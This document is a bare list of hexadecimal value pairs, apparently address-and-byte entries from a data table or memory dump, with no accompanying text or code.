0x00F0D948, 0x0000007C, 0x00F0F680, 0x00000051, 0x00F0CAB8, 0x0000005E, 0x00F12B48, 0x0000005C, 0x00F12C88, 0x00000046, 0x00F113F8, 0x00000061, 0x00F095E8, 0x00000016, 0x00F0BBE8, 0x00000015, 0x00F10738, 0x00000033, 0x00F0F700, 0x00000034, 0x00F129A0, 0x00000079, 0x00F0D790, 0x0000006B, 0x00F0DA18, 0x00000000, 0x00F0E958, 0x0000007C, 0x00F11200, 0x00000031, 0x00F0B688, 0x00000069, 0x00F125D0, 0x00000047, 0x00F0E0D0, 0x0000007D, 0x00F09780, 0x0000002D, 0x00F11D78, 0x0000006D, 0x00F0CF00, 0x00000046, 0x00F11A20, 0x00000051, 0x00F0A280, 0x0000003C, 0x00F0AF68, 0x00000056, 0x00F0C348, 0x00000038, 0x00F0D8D8, 0x00000054, 0x00F0F700, 0x00000036, 0x00F0E3F0, 0x00000031, 0x00F0FDF0, 0x00000056, 0x00F0C2A8, 0x0000002F, 0x00F10818, 0x00000052, 0x00F0B368, 0x0000001A, 0x00F0A1B0, 0x00000001, 0x00F10DB8, 0x0000007B, 0x00F10880, 0x00000015, 0x00F0C8E8, 0x0000002C, 0x00F09C18, 0x00000079, 0x00F110A8, 0x0000000E, 0x00F11AE8, 0x00000067, 0x00F0C030, 0x00000021, 0x00F10248, 0x00000043, 0x00F0C098, 0x00000062, 0x00F0BC38, 0x0000003B, 0x00F0E0B8, 0x0000000B, 0x00F0B490, 0x0000002B, 0x00F0C680, 0x00000025, 0x00F10E98, 0x00000069, 0x00F0E6B0, 0x00000027, 0x00F10720, 0x00000061, 0x00F0C7E8, 0x00000057, 0x00F0B840, 0x0000001E, 0x00F0E990, 0x0000005B, 0x00F12A48, 0x0000003F, 0x00F0E698, 0x0000001C, 0x00F0AC90, 0x00000064, 0x00F09990, 0x00000053, 0x00F0CC38, 0x00000023, 0x00F119D0, 0x0000001E, 0x00F0FA48, 0x00000062, 0x00F128D0, 0x0000002E, 0x00F0D7B0, 0x00000075, 0x00F0A0D8, 0x0000001A, 0x00F0E140, 0x0000001F, 0x00F0FAE8, 0x00000060, 0x00F0A4E0, 0x0000004D, 0x00F09838, 0x0000000C, 0x00F0D5B8, 0x00000077, 0x00F0EDF0, 0x0000002C, 0x00F0F0A0, 0x00000025, 0x00F0E6E8, 0x00000070, 0x00F0CE88, 0x00000034, 0x00F0D7F0, 0x00000034, 0x00F11A58, 0x0000004C, 0x00F0B5C0, 0x00000032, 0x00F11D30, 0x00000032, 0x00F10F90, 0x0000003D, 0x00F100D0, 0x00000057, 0x00F12AF8, 0x00000034, 0x00F0A510, 0x0000003E, 0x00F0CB50, 0x00000003, 0x00F114F8, 0x0000004C, 0x00F0FC18, 0x00000076, 0x00F0CDE0, 0x00000077, 0x00F0F010, 0x0000002E, 0x00F0E018, 0x00000062, 0x00F0EA20, 0x00000062, 0x00F0CE88, 0x00000070, 0x00F120E8, 0x0000006F, 0x00F10968, 0x0000005F, 0x00F0CB68, 0x00000033, 0x00F11E70, 0x00000056, 0x00F093A8, 0x00000041, 0x00F0F6B0, 0x00000018, 0x00F0C1D8, 0x00000000, 0x00F0C6C8, 0x0000003C, 0x00F12460, 0x0000002E, 0x00F0BAD8, 0x00000014, 0x00F09110, 0x0000005E, 0x00F09B48, 0x00000022, 0x00F129F0, 0x0000005C, 0x00F0CDB0, 0x00000053, 0x00F09940, 0x00000035, 0x00F0CAC8, 0x00000068, 0x00F11868, 0x0000001E, 0x00F0B4A8, 0x00000022, 0x00F118F8, 0x0000001D, 0x00F0C490, 0x0000001E, 0x00F0D758, 0x00000026, 0x00F0AD50, 0x00000026, 0x00F0C480, 0x00000071, 0x00F129B0, 0x0000003B, 0x00F0E8E0, 0x0000006C, 0x00F0EEC8, 0x0000007E, 0x00F0B0D8, 0x00000072, 0x00F0B268, 0x0000001A, 0x00F11390, 0x0000001E, 0x00F122E8, 0x00000078, 0x00F0A900, 0x0000000E, 0x00F107D8, 0x0000000D, 0x00F0E9B0, 0x0000003A, 0x00F096D8, 0x00000004, 0x00F0A488, 0x00000050, 0x00F0CAC0, 0x0000000A, 0x00F0D030, 0x00000048, 0x00F09C70, 0x00000020, 0x00F10868, 0x00000066, 0x00F12778, 0x0000007A, 0x00F0DF88, 0x00000031, 0x00F11BC8, 0x0000000D, 0x00F0E5F8, 0x00000048, 0x00F09700, 0x00000030, 0x00F126E0, 0x00000040, 0x00F0E780, 0x00000004, 0x00F0F1A0, 0x00000002, 0x00F0C5F0, 0x00000075, 0x00F0CF48, 0x0000002D, 0x00F0E000, 0x0000001A, 0x00F0D9C8, 0x0000001A, 0x00F0B5C8, 0x0000003A, 0x00F0ED98, 0x00000064, 0x00F12350, 0x00000040, 0x00F0CC58, 0x00000027, 0x00F0FDE8, 0x0000006B, 0x00F10D20, 0x00000056, 0x00F09460, 0x0000006B, 0x00F0E4A8, 0x00000063, 0x00F0C190, 0x0000005E, 0x00F0C578, 0x00000072, 0x00F0DF78, 0x00000045, 0x00F0A3F0, 0x00000006, 0x00F0C590, 0x00000064, 0x00F0DDF0, 0x00000044, 0x00F0E710, 0x00000022, 0x00F10F80, 0x0000002E, 0x00F0CA30, 0x0000007D, 0x00F122E0, 0x00000026, 0x00F0B3F0, 0x00000074, 0x00F0C208, 0x0000005A, 0x00F10E48, 0x00000024, 0x00F0B460, 0x0000001D, 0x00F0AD00, 0x0000006A, 0x00F102F0, 0x00000025, 0x00F0DB58, 0x00000041, 0x00F0A948, 0x00000054, 0x00F0D450, 0x0000003C, 0x00F11098, 0x00000001, 0x00F0F7F8, 0x00000043, 0x00F0F3E0, 0x00000035, 0x00F10198, 0x00000008, 0x00F0D6E8, 0x00000024, 0x00F0A168, 0x00000043, 0x00F11C08, 0x00000019, 0x00F0FAD0, 0x00000048, 0x00F0F3C8, 0x0000001A, 0x00F0C908, 0x0000005D, 0x00F0EB50, 0x0000002F, 0x00F12378, 0x00000007, 0x00F0BA48, 0x00000061, 0x00F11B18, 0x00000022, 0x00F0CA58, 0x00000069, 0x00F0AC10, 0x0000000E, 0x00F0B5B0, 0x00000036, 0x00F0A368, 0x00000024, 0x00F0C9A0, 0x0000001C, 0x00F126C8, 0x00000054, 0x00F09808, 0x00000003, 0x00F0DA80, 0x0000002B, 0x00F0B5D0, 0x00000038, 0x00F11AF0, 0x00000077, 0x00F0C440, 0x00000062, 0x00F0E9F8, 0x00000003, 0x00F0EEF0, 0x0000001F, 0x00F0EFF8, 0x00000062, 0x00F0E678, 0x0000004C, 0x00F0B350, 0x00000071, 0x00F0A460, 0x0000001D, 0x00F09B68, 0x00000004, 0x00F0CD68, 0x00000059, 0x00F0C0A0, 0x00000040, 0x00F0D3E8, 0x00000004, 0x00F09930, 0x0000003F, 0x00F12798, 0x00000033, 0x00F09830, 0x00000075, 0x00F0DFB0, 0x00000065, 0x00F0BB18, 0x00000062, 0x00F0E500, 0x00000018, 0x00F0C150, 0x0000001F, 0x00F096F8, 0x00000068, 0x00F11D90, 0x00000045, 0x00F09400, 0x00000005, 0x00F12800, 0x00000043, 0x00F0A460, 0x00000043, 0x00F0F3A0, 0x00000015, 0x00F0C2C0, 0x00000004, 0x00F10120, 0x00000079, 0x00F0B4C0, 0x00000057, 0x00F0F3C0, 0x0000002A, 0x00F0ABE0, 0x00000007, 0x00F0E4B0, 0x00000010, 0x00F10968, 0x00000064, 0x00F0A1F8, 0x00000011, 0x00F0A248, 0x00000006, 0x00F0C908, 0x00000066, 0x00F12468, 0x00000069, 0x00F10FB0, 0x00000026, 0x00F098D8, 0x00000015, 0x00F12428, 0x0000005B, 0x00F0DCA8, 0x00000018, 0x00F0C5C0, 0x0000005C, 0x00F11D40, 0x00000034, 0x00F09DB0, 0x00000057, 0x00F0CA60, 0x0000006A, 0x00F0F188, 0x00000017, 0x00F0D5D8, 0x0000003D, 0x00F0A110, 0x0000000E, 0x00F0D380, 0x00000067, 0x00F0D0E0, 0x00000032, 0x00F09710, 0x00000065, 0x00F0ABF0, 0x00000039, 0x00F0EB08, 0x0000006F, 0x00F10428, 0x0000001E, 0x00F0DDC8, 0x00000068, 0x00F0C250, 0x0000001D, 0x00F11828, 0x0000003F, 0x00F113F8, 0x0000001F, 0x00F09528, 0x00000057, 0x00F0EB80, 0x0000000F, 0x00F10790, 0x0000007E, 0x00F0B340, 0x00000039, 0x00F0B8C8, 0x00000075, 0x00F0EC48, 0x0000002A, 0x00F0F138, 0x00000008, 0x00F0A500, 0x00000021, 0x00F0EBE0, 0x0000004F, 0x00F10980, 0x0000001B, 0x00F0BED8, 0x0000002D, 0x00F0B8F0, 0x0000006D, 0x00F0A408, 0x00000057, 0x00F0DCA8, 0x0000001B, 0x00F0B660, 0x00000046, 0x00F0BE58, 0x0000004B, 0x00F09EF0, 0x0000003B, 0x00F0E198, 0x00000078, 0x00F0D210, 0x0000003A, 0x00F097A8, 0x00000063, 0x00F0A5F0, 0x0000003C, 0x00F12358, 0x00000046, 0x00F09608, 0x00000042, 0x00F0E168, 0x0000005E, 0x00F0A6F8, 0x0000004B, 0x00F104F8, 0x0000003B, 0x00F11910, 0x0000003A, 0x00F0D708, 0x00000003, 0x00F0B0A0, 0x00000024, 0x00F0D138, 0x0000000C, 0x00F0FAD8, 0x00000021, 0x00F09618, 0x00000071, 0x00F0BE60, 0x00000019, 0x00F118C0, 0x00000014, 0x00F0E818, 0x0000002C, 0x00F12AC0, 0x00000015, 0x00F09D88, 0x00000005, 0x00F09480, 0x00000072, 0x00F0B538, 0x00000003, 0x00F0E748, 0x00000011, 0x00F0DDD0, 0x00000044, 0x00F0C718, 0x0000006D, 0x00F0E278, 0x0000001B, 0x00F0EB70, 0x0000006D, 0x00F12108, 0x0000006F, 0x00F09C48, 0x00000050, 0x00F0E8C8, 0x0000002A, 0x00F10E30, 0x00000053, 0x00F129B0, 0x00000014, 0x00F12828, 0x0000000C, 0x00F0EF68, 0x00000045, 0x00F0C588, 0x00000076, 0x00F0DA50, 0x0000002A, 0x00F0DCC0, 0x00000060, 0x00F0C240, 0x00000016, 0x00F0AC70, 0x00000009, 0x00F10BA8, 0x00000013, 0x00F10620, 0x0000002F, 0x00F0C390, 0x00000036, 0x00F117A8, 0x00000067, 0x00F12588, 0x0000004D, 0x00F09290, 0x0000006D, 0x00F121B8, 0x00000027, 0x00F0F230, 0x00000052, 0x00F0C2A8, 0x00000034, 0x00F0DB60, 0x00000031, 0x00F10450, 0x00000068, 0x00F0A500, 0x00000055, 0x00F0A9D8, 0x0000006E, 0x00F11958, 0x0000006A, 0x00F0FDA8, 0x00000036, 0x00F09998, 0x00000043, 0x00F107C8, 0x00000070, 0x00F10CD0, 0x00000028, 0x00F0A2D0, 0x00000061, 0x00F0B7B0, 0x00000057, 0x00F0C520, 0x00000033, 0x00F12C48, 0x00000015, 0x00F0D828, 0x00000041, 0x00F0DA90, 0x0000007B, 0x00F0D0C0, 0x00000069, 0x00F0D120, 0x00000000, 0x00F10C78, 0x00000059, 0x00F10BA8, 0x00000026, 0x00F09788, 0x0000007D, 0x00F0D0C8, 0x00000015, 0x00F0D528, 0x00000003, 0x00F0B940, 0x0000005A, 0x00F0E3F0, 0x00000006, 0x00F0D4E8, 0x00000025, 0x00F10178, 0x00000053, 0x00F09E08, 0x00000044, 0x00F0A888, 0x00000001, 0x00F0A7C0, 0x0000001C, 0x00F0A7D0, 0x00000011, 0x00F0CF50, 0x00000004, 0x00F122C0, 0x00000010, 0x00F0E9A0, 0x00000018, 0x00F0C7F8, 0x00000046, 0x00F09480, 0x0000000B, 0x00F0CD38, 0x00000069, 0x00F0D4D0, 0x00000009, 0x00F11FC8, 0x00000004, 0x00F0FD68, 0x00000019, 0x00F0A698, 0x0000005D, 0x00F09FF0, 0x00000018, 0x00F11358, 0x00000032, 0x00F0D7B0, 0x00000060, 0x00F0D100, 0x0000007A, 0x00F120F0, 0x00000006, 0x00F09F78, 0x0000000F, 0x00F09BB0, 0x00000049, 0x00F0CF28, 0x00000065, 0x00F0F670, 0x00000041, 0x00F0A240, 0x00000046, 0x00F0CF48, 0x00000048, 0x00F12398, 0x0000002E, 0x00F0AFF8, 0x0000001F, 0x00F09888, 0x00000028, 0x00F09290, 0x00000071, 0x00F0F808, 0x0000006A, 0x00F0D2D8, 0x00000024, 0x00F0C858, 0x00000004, 0x00F0CDA8, 0x00000009, 0x00F09858, 0x00000054, 0x00F0A510, 0x00000075, 0x00F0FE98, 0x00000022, 0x00F10970, 0x0000004C, 0x00F0C6B0, 0x00000015, 0x00F09608, 0x0000006F, 0x00F09B50, 0x00000056, 0x00F10800, 0x0000004D, 0x00F111A8, 0x00000030, 0x00F0BD30, 0x00000050, 0x00F09C20, 0x0000004B, 0x00F0B7F8, 0x0000007B, 0x00F0A080, 0x0000000F, 0x00F0E1E8, 0x0000000C, 0x00F0BC08, 0x0000003D, 0x00F0A1B8, 0x0000003F, 0x00F0ECB8, 0x00000021, 0x00F0B7F0, 0x0000003F, 0x00F12138, 0x00000013, 0x00F105D0, 0x0000003B, 0x00F0B658, 0x0000002E, 0x00F0B228, 0x0000003C, 0x00F0D330, 0x0000005F, 0x00F0C8B0, 0x00000030, 0x00F0B030, 0x00000039, 0x00F09BC0, 0x0000003F, 0x00F0C1D8, 0x00000029, 0x00F0BFA0, 0x00000077, 0x00F113B0, 0x0000000C, 0x00F0F068, 0x0000003F, 0x00F0D8A8, 0x00000038, 0x00F10A10, 0x0000002E, 0x00F0BAF8, 0x00000061, 0x00F0C4C8, 0x00000057, 0x00F0A4D8, 0x00000017, 0x00F12990, 0x0000006D, 0x00F121F0, 0x00000029, 0x00F0A790, 0x00000069, 0x00F0DCE0, 0x0000002B, 0x00F0AA88, 0x0000002E, 0x00F0B9B0, 0x00000079, 0x00F0BB70, 0x00000039, 0x00F0E268, 0x0000006B, 0x00F10AC8, 0x0000004D, 0x00F11430, 0x00000010, 0x00F0DDC8, 0x0000004F, 0x00F106F8, 0x00000034, 0x00F11578, 0x00000028, 0x00F0DAC8, 0x0000007A, 0x00F0A018, 0x0000005F, 0x00F0FA30, 0x0000004B, 0x00F0BC70, 0x0000005B, 0x00F0CEA0, 0x0000006B, 0x00F11E40, 0x0000005E, 0x00F0C1D8, 0x00000072, 0x00F0F950, 0x00000031, 0x00F11FA0, 0x00000011, 0x00F126B0, 0x00000030, 0x00F0C458, 0x00000022, 0x00F10030, 0x0000000F, 0x00F0D770, 0x0000002F, 0x00F0E218, 0x0000007D, 0x00F0D4F0, 0x0000005D, 0x00F0F2B8, 0x00000026, 0x00F0CF68, 0x0000003F, 0x00F0ABE0, 0x0000001C, 0x00F10C00, 0x00000034, 0x00F0D330, 0x0000002D, 0x00F11C80, 0x00000038, 0x00F0B678, 0x0000002D, 0x00F10220, 0x00000053, 0x00F0D410, 0x00000044, 0x00F0B148, 0x00000001, 0x00F0D310, 0x00000041, 0x00F11CA0, 0x00000046, 0x00F0E0D8, 0x00000074, 0x00F0CD78, 0x00000069, 0x00F10248, 0x0000002D, 0x00F10790, 0x00000046, 0x00F0A748, 0x0000004D, 0x00F0CEA0, 0x00000062, 0x00F11720, 0x00000000, 0x00F0B658, 0x0000003B, 0x00F0CA58, 0x0000002F, 0x00F10000, 0x00000045, 0x00F10EF8, 0x00000012, 0x00F0F470, 0x00000052, 0x00F09B40, 0x00000022, 0x00F0A3A0, 0x00000032, 0x00F0E348, 0x0000002E, 0x00F10FC8, 0x00000037, 0x00F0B3C8, 0x0000005C, 0x00F12600, 0x00000020, 0x00F0EEE8, 0x0000006E, 0x00F12720, 0x00000067, 0x00F123A0, 0x00000065, 0x00F09BB0, 0x00000008, 0x00F094A0, 0x00000023, 0x00F0B2E0, 0x00000037, 0x00F11E58, 0x00000051, 0x00F09AE0, 0x0000002B, 0x00F0DCC0, 0x0000006A, 0x00F11310, 0x00000060, 0x00F12258, 0x00000024, 0x00F0E7F0, 0x00000078, 0x00F0ED10, 0x00000063, 0x00F0A008, 0x0000003D, 0x00F12530, 0x00000053, 0x00F0CD10, 0x00000021, 0x00F10770, 0x00000072, 0x00F0A9A0, 0x00000025, 0x00F103D0, 0x00000065, 0x00F09B90, 0x00000032, 0x00F0F710, 0x00000041, 0x00F11DB0, 0x00000063, 0x00F0B500, 0x00000036, 0x00F0B0A8, 0x00000067, 0x00F0F150, 0x00000044, 0x00F09E38, 0x00000050, 0x00F0A2A8, 0x00000054, 0x00F0C7F0, 0x00000013, 0x00F10038, 0x00000075, 0x00F0C0E8, 0x00000008, 0x00F12920, 0x00000005, 0x00F11460, 0x00000024, 0x00F0CB60, 0x0000001C, 0x00F0D588, 0x00000047, 0x00F0A010, 0x00000062, 0x00F0E240, 0x00000052, 0x00F0AF78, 0x00000045, 0x00F0C530, 0x00000063, 0x00F11240, 0x0000001D, 0x00F0B058, 0x00000066, 0x00F10930, 0x0000004E, 0x00F095F0, 0x00000060, 0x00F0B168, 0x00000061, 0x00F0CB68, 0x00000020, 0x00F11DB8, 0x0000001F, 0x00F107A8, 0x0000002F, 0x00F0D388, 0x0000004C, 0x00F11738, 0x00000044, 0x00F0BFB0, 0x0000006D, 0x00F0D560, 0x00000002, 0x00F0D458, 0x00000022, 0x00F0CB90, 0x00000041, 0x00F119E0, 0x0000003C, 0x00F0A1B8, 0x00000043, 0x00F0DA28, 0x00000077, 0x00F0AAA8, 0x00000078, 0x00F12890, 0x00000064, 0x00F0D0F8, 0x00000039, 0x00F0E5D8, 0x0000001F, 0x00F0C1D8, 0x0000002E, 0x00F0BD10, 0x00000043, 0x00F0E3C0, 0x00000033, 0x00F112B8, 0x0000002C, 0x00F0E910, 0x00000007, 0x00F0BE70, 0x00000016, 0x00F0A0A0, 0x0000006B, 0x00F0E5F8, 0x0000000F, 0x00F0AB70, 0x0000003A, 0x00F0BBF8, 0x00000060, 0x00F0A3B8, 0x00000077, 0x00F119E8, 0x00000055, 0x00F0A520, 0x00000056, 0x00F11000, 0x00000004, 0x00F0BA88, 0x00000065, 0x00F0ADF0, 0x0000000F, 0x00F11C78, 0x0000002D, 0x00F0E6C0, 0x0000006D, 0x00F10C78, 0x0000007C, 0x00F0D6E8, 0x0000004B, 0x00F09230, 0x00000057, 0x00F10AD8, 0x00000069, 0x00F0DA50, 0x00000009, 0x00F0E3A8, 0x0000003B, 0x00F11060, 0x00000066, 0x00F0F5D0, 0x0000000F, 0x00F0DBB0, 0x0000005B, 0x00F0E0D0, 0x00000076, 0x00F099F8, 0x00000022, 0x00F0E930, 0x0000005B, 0x00F0BFE0, 0x00000060, 0x00F0B940, 0x00000055, 0x00F11990, 0x00000079, 0x00F0F208, 0x00000054, 0x00F09508, 0x0000005D, 0x00F0DD50, 0x00000077, 0x00F0F198, 0x0000000F, 0x00F0C268, 0x00000067, 0x00F0C728, 0x00000044, 0x00F0B2E8, 0x00000062, 0x00F11028, 0x00000053, 0x00F0C918, 0x00000051, 0x00F0DDE8, 0x00000032, 0x00F0A3D8, 0x0000003E, 0x00F0DF78, 0x00000062, 0x00F0DFF0, 0x00000039, 0x00F117D0, 0x00000003, 0x00F126C0, 0x00000043, 0x00F0BD58, 0x00000056, 0x00F0B2E8, 0x0000004E, 0x00F0CB38, 0x00000009, 0x00F10D00, 0x0000002D, 0x00F0C080, 0x00000065, 0x00F0D960, 0x00000032, 0x00F0ADF0, 0x00000070, 0x00F0CDB8, 0x00000064, 0x00F0CC40, 0x0000007A, 0x00F0C8A0, 0x00000057, 0x00F0EA20, 0x0000002C, 0x00F11600, 0x0000003A, 0x00F0BD18, 0x00000009, 0x00F0DC30, 0x00000017, 0x00F09AC0, 0x00000014, 0x00F0E5F8, 0x0000004D, 0x00F10458, 0x00000071, 0x00F12460, 0x00000063, 0x00F0F188, 0x00000023, 0x00F0B9B0, 0x0000000B, 0x00F0D830, 0x00000004, 0x00F11E48, 0x0000001C, 0x00F0C068, 0x00000044, 0x00F0E898, 0x0000004E, 0x00F0D2F8, 0x0000003A, 0x00F0ECD8, 0x00000076, 0x00F0D490, 0x00000057, 0x00F0A680, 0x0000001E, 0x00F0B860, 0x00000071, 0x00F09300, 0x00000017, 0x00F108C8, 0x00000043, 0x00F0D798, 0x00000013, 0x00F10B08, 0x00000058, 0x00F0B0F0, 0x0000003D, 0x00F0C0F0, 0x00000030, 0x00F12860, 0x0000005A, 0x00F124A0, 0x00000075, 0x00F0C550, 0x00000016, 0x00F09288, 0x00000064, 0x00F0B050, 0x00000050, 0x00F0FA38, 0x00000059, 0x00F0FB50, 0x0000002E, 0x00F09180, 0x00000035, 0x00F10FE8, 0x00000045, 0x00F0C010, 0x0000005A, 0x00F09D58, 0x00000003, 0x00F0CD58, 0x00000027, 0x00F0D128, 0x0000005A, 0x00F11B30, 0x0000000A, 0x00F0AE20, 0x0000002E, 0x00F10530, 0x00000025, 0x00F0CED0, 0x0000000D, 0x00F093D8, 0x00000030, 0x00F0A480, 0x0000003F, 0x00F12198, 0x0000005A, 0x00F12690, 0x00000047, 0x00F0C710, 0x00000007, 0x00F0AAC0, 0x00000029, 0x00F11728, 0x00000026, 0x00F12CB0, 0x00000035, 0x00F0ECA0, 0x0000006E, 0x00F10AB8, 0x0000004C, 0x00F0F5B0, 0x0000003B, 0x00F0B128, 0x00000013, 0x00F0D708, 0x00000068, 0x00F0E460, 0x00000035, 0x00F0C490, 0x00000056, 0x00F106C0, 0x00000038, 0x00F12690, 0x00000011, 0x00F0A120, 0x0000005F, 0x00F0D410, 0x00000018, 0x00F11A20, 0x00000036, 0x00F09540, 0x00000058, 0x00F11EA8, 0x00000034, 0x00F10AD0, 0x00000077, 0x00F0A0D8, 0x0000001B, 0x00F0D090, 0x0000003D, 0x00F10AA0, 0x0000000E, 0x00F09498, 0x00000068, 0x00F0A7A0, 0x00000052, 0x00F0D918, 0x0000003D, 0x00F0E938, 0x00000072, 0x00F0FA10, 0x00000007, 0x00F0B130, 0x0000001D, 0x00F0D250, 0x0000005B, 0x00F0C3E0, 0x00000061, 0x00F0D678, 0x00000076, 0x00F0D040, 0x00000045, 0x00F0D6C0, 0x0000004F, 0x00F0A448, 0x00000047, 0x00F0C0B8, 0x0000005F, 0x00F0CCA8, 0x0000004B, 0x00F0C470, 0x00000040, 0x00F0D210, 0x00000006, 0x00F0A0D0, 0x0000007A, 0x00F0ED80, 0x00000055, 0x00F0F2E0, 0x0000003E, 0x00F099F0, 0x00000034, 0x00F0B6E8, 0x0000005C, 0x00F0B120, 0x00000027, 0x00F0E510, 0x00000040, 0x00F0C108, 0x0000005C, 0x00F0B148, 0x00000039, 0x00F0AAB8, 0x00000047, 0x00F0A918, 0x00000050, 0x00F0B9A0, 0x00000001, 0x00F09C58, 0x00000076, 0x00F12310, 0x00000043, 0x00F0F128, 0x00000059, 0x00F12388, 0x00000023, 0x00F0F890, 0x00000029, 0x00F0F650, 0x00000006, 0x00F11CD8, 0x00000005, 0x00F09378, 0x0000006B, 0x00F0DFA0, 0x00000066, 0x00F12410, 0x00000065, 0x00F0CCE0, 0x00000050, 0x00F0A560, 0x0000000E, 0x00F0A948, 0x0000000B, 0x00F10378, 0x0000003A, 0x00F0F348, 0x0000002D, 0x00F0B370, 0x0000002D, 0x00F0EC30, 0x00000041, 0x00F0FE98, 0x00000026, 0x00F0B6D0, 0x0000004F, 0x00F0CA88, 0x00000071, 0x00F0B820, 0x00000012, 0x00F0B958, 0x00000070, 0x00F122C8, 0x00000016, 0x00F0C7E0, 0x00000034, 0x00F0B4B0, 0x0000001E, 0x00F090C8, 0x0000000F, 0x00F0EFE8, 0x0000000A, 0x00F0E6E0, 0x00000059, 0x00F12338, 0x0000007C, 0x00F0D2D0, 0x0000003C, 0x00F112C8, 0x0000001C, 0x00F0EBF8, 0x00000036, 0x00F11B48, 0x0000002D, 0x00F0D9C0, 0x00000041, 0x00F0B358, 0x00000056, 0x00F09E50, 0x0000002C, 0x00F0AAB8, 0x0000003A, 0x00F0B188, 0x0000004D, 0x00F0D5E8, 0x00000058, 0x00F0B060, 0x00000053, 0x00F0CF20, 0x00000064, 0x00F11FB8, 0x00000007, 0x00F0A5B8, 0x00000053, 0x00F11B80, 0x0000004D, 0x00F114D0, 0x00000007, 0x00F0DDF8, 0x0000001A, 0x00F106D8, 0x0000003A, 0x00F0DD78, 0x00000038, 0x00F0C560, 0x00000010, 0x00F105D0, 0x00000006, 0x00F0EE00, 0x00000006, 0x00F10E20, 0x00000037, 0x00F0FDE0, 0x00000011, 0x00F0A530, 0x00000078, 0x00F09880, 0x00000024, 0x00F100B0, 0x00000034, 0x00F0AF70, 0x00000000, 0x00F0BF68, 0x00000053, 0x00F12010, 0x00000079, 0x00F12110, 0x00000021, 0x00F122D0, 0x00000010, 0x00F0CE28, 0x00000045, 0x00F0B2C8, 0x00000011, 0x00F0E630, 0x0000006D, 0x00F0CDF0, 0x00000021, 0x00F0D978, 0x00000017, 0x00F10C50, 0x0000005E, 0x00F094F8, 0x0000001B, 0x00F0E810, 0x0000006B, 0x00F11348, 0x0000007C, 0x00F128D0, 0x00000032, 0x00F0AAA0, 0x0000006B, 0x00F0D818, 0x00000022, 0x00F0BA60, 0x00000028, 0x00F0CEA8, 0x00000030, 0x00F0F8C8, 0x00000030, 0x00F11F48, 0x0000005C, 0x00F0E130, 0x0000005B, 0x00F0F200, 0x0000000E, 0x00F0EBA8, 0x00000041, 0x00F110C0, 0x0000000A, 0x00F12208, 0x00000033, 0x00F0A888, 0x0000004B, 0x00F0EF60, 0x00000008, 0x00F0A1D0, 0x00000009, 0x00F0AF10, 0x00000004, 0x00F0A750, 0x00000023, 0x00F0BC68, 0x00000031, 0x00F0B318, 0x00000062, 0x00F10A10, 0x00000059, 0x00F12348, 0x00000015, 0x00F0EBA8, 0x00000003, 0x00F0FC20, 0x00000022, 0x00F12B88, 0x0000001C, 0x00F105D0, 0x00000009, 0x00F12BD0, 0x00000043, 0x00F096D0, 0x00000051, 0x00F09DF0, 0x0000004B, 0x00F0E0A0, 0x0000001C, 0x00F0BDC8, 0x00000059, 0x00F10F20, 0x0000000D, 0x00F0B940, 0x00000067, 0x00F0AE80, 0x00000007, 0x00F0D8C8, 0x0000006B, 0x00F0CE00, 0x00000040, 0x00F0E288, 0x0000006A, 0x00F0CDB0, 0x0000002E, 0x00F0C9F0, 0x00000042, 0x00F0DC30, 0x00000079, 0x00F0C730, 0x00000071, 0x00F0C078, 0x00000040, 0x00F0F3F8, 0x0000002B, 0x00F0FA18, 0x0000006E, 0x00F0DC40, 0x0000006F, 0x00F10360, 0x00000009, 0x00F0DEB8, 0x0000000F, 0x00F0D3B8, 0x00000009, 0x00F121A8, 0x00000023, 0x00F091A8, 0x0000004C, 0x00F10BC0, 0x00000027, 0x00F0C1F8, 0x00000023, 0x00F0DD80, 0x00000004, 0x00F0D298, 0x00000067, 0x00F09AE0, 0x00000048, 0x00F09AE8, 0x00000067, 0x00F115E8, 0x0000006D, 0x00F0DBB8, 0x0000005C, 0x00F096D0, 0x00000056, 0x00F0E758, 0x0000003E, 0x00F0B030, 0x00000061, 0x00F09A00, 0x00000032, 0x00F0A3B8, 0x00000052, 0x00F12460, 0x0000006F, 0x00F12340, 0x00000060, 0x00F09C48, 0x00000053, 0x00F0FC10, 0x00000014, 0x00F0AF98, 0x0000005D, 0x00F0AAF0, 0x00000075, 0x00F11480, 0x00000015, 0x00F0DFB8, 0x00000011, 0x00F0E0C8, 0x00000051, 0x00F100B0, 0x00000050, 0x00F12408, 0x0000006B, 0x00F0BFA8, 0x0000004C, 0x00F10018, 0x00000003, 0x00F11078, 0x00000003, 0x00F0A0C8, 0x00000023, 0x00F110C0, 0x00000077, 0x00F12A90, 0x00000023, 0x00F0D348, 0x0000006D, 0x00F0FDD8, 0x00000058, 0x00F11038, 0x00000010, 0x00F09190, 0x00000026, 0x00F0B3A8, 0x00000039, 0x00F0BDB0, 0x00000077, 0x00F09D78, 0x0000003F, 0x00F0E758, 0x0000000D, 0x00F0D648, 0x00000074, 0x00F0BE68, 0x00000064, 0x00F09D70, 0x0000003F, 0x00F0CD58, 0x00000066, 0x00F106A8, 0x00000060, 0x00F09B30, 0x0000004C, 0x00F0AA08, 0x00000075, 0x00F0CC10, 0x00000066, 0x00F0A940, 0x00000040, 0x00F0B2E0, 0x0000000C, 0x00F12538, 0x0000001F, 0x00F0B7A0, 0x0000001C, 0x00F10220, 0x0000006E, 0x00F0D2A8, 0x00000030, 0x00F09F20, 0x00000025, 0x00F0FAD8, 0x00000053, 0x00F112B0, 0x0000006A, 0x00F0EFE0, 0x00000026, 0x00F0AA78, 0x00000005, 0x00F0DA10, 0x00000002, 0x00F101F8, 0x0000002D, 0x00F09DC0, 0x00000008, 0x00F113E0, 0x0000006E, 0x00F10158, 0x00000067, 0x00F0DFF0, 0x00000077, 0x00F09218, 0x0000007E, 0x00F10950, 0x0000006C, 0x00F10610, 0x0000004A, 0x00F0DB58, 0x0000005C, 0x00F0BDA0, 0x0000004C, 0x00F09AB0, 0x00000036, 0x00F0DA80, 0x00000045, 0x00F126A8, 0x00000063, 0x00F0C6F0, 0x00000078, 0x00F0C6B8, 0x0000001E, 0x00F0A988, 0x0000004D, 0x00F102A8, 0x00000049, 0x00F0B1B8, 0x00000016, 0x00F0A180, 0x0000002E, 0x00F0FD70, 0x0000003D, 0x00F12188, 0x00000058, 0x00F0FFC8, 0x0000002C, 0x00F0AE48, 0x0000004B, 0x00F12AA0, 0x0000001D, 0x00F0B510, 0x00000075, 0x00F126E0, 0x00000044, 0x00F09EA8, 0x0000000D, 0x00F0CCD0, 0x0000006E, 0x00F11770, 0x0000003B, 0x00F12C50, 0x00000009, 0x00F12AB0, 0x00000031, 0x00F0C0F8, 0x0000002E, 0x00F0F078, 0x00000037, 0x00F11AD0, 0x0000001D, 